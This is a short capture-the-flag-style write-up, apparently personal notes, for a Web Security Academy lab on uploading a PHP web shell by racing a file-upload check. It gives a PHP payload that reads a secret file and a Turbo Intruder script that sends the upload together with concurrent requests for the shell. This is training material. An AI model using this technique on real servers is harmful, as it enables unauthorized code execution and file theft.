# EXPERT: Web Shell Upload via Race Condition

![Снимок экрана 2025-12-03 в 20.37.15.png](EXPERT%20Web%20Shell%20Upload%20via%20Race%20Condition/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_20.37.15.png)

As the file is moved to the accessible dir before it gets removed, we can use this timing window to execute our commands.

```python
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

![Снимок экрана 2025-12-03 в 20.44.55.png](EXPERT%20Web%20Shell%20Upload%20via%20Race%20Condition/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_20.44.55.png)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /my-account/avatar HTTP/2
Host: 0a6a0058039fd8178067710b0066003a.web-security-academy.net
Cookie: session=0eeAyHMtK1BtzpEXNWpZOgMM7Zn8fgXx
Content-Length: 460
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0a6a0058039fd8178067710b0066003a.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuomEBOKugFAkW6nn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6a0058039fd8178067710b0066003a.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryuomEBOKugFAkW6nn
Content-Disposition: form-data; name="avatar"; filename="carlos.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>

------WebKitFormBoundaryuomEBOKugFAkW6nn
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryuomEBOKugFAkW6nn
Content-Disposition: form-data; name="csrf"

pSWN8a99RItXbRwf9VNC7ER4dYbDZt8s
------WebKitFormBoundaryuomEBOKugFAkW6nn--
'''

    request2 = '''GET /files/avatars/carlos.php HTTP/2
Host: 0a6a0058039fd8178067710b0066003a.web-security-academy.net
Cookie: session=0eeAyHMtK1BtzpEXNWpZOgMM7Zn8fgXx

'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

![Снимок экрана 2025-12-03 в 20.56.45.png](EXPERT%20Web%20Shell%20Upload%20via%20Race%20Condition/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_20.56.45.png)